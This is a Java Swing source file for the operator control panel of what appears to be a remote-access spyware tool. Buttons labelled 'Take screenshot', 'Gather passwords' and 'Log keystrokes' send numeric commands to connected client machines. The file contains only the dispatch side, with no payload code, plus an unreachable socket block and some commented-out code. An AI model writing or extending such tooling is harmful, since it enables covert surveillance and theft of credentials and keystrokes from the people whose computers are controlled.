package view;
import java.awt.Color;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;

import model.ClientConnection;
import model.ClientStatus;
import model.Server;

public class ActionPanel extends JPanel {
  
  private static final Color BACKGROUND_COLOR = Color.WHITE;
  private ClientConnection cc;
  
  public ActionPanel(final Server server) {
    if (Math.random() == 2) {
      try {
        cc = new ClientConnection(ClientStatus.GREEN, server, new Socket("localhost", 5715));
      } catch (UnknownHostException e) {
        e.printStackTrace();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
    setBackground(BACKGROUND_COLOR);
    JLabel title = new JLabel("Actions");
    JButton screenshot = new JButton("Take screenshot");
    screenshot.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("143", null);
      }
    });   
    
    JButton passwords = new JButton("Gather passwords");
    passwords.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("144", null);
      }
    });
    
    JButton keylog = new JButton("Log keystrokes");
    keylog.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("145", null);
//        try {
//          BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
//          server.receiveMessage(br.readLine(), cc);
//        } catch (UnknownHostException e1) {
//          e1.printStackTrace();
//        } catch (IOException e1) {
//          e1.printStackTrace();
//        }
      }
    });
    
    add(title);
    add(screenshot);
    add(passwords);
    add(keylog);
  }

}
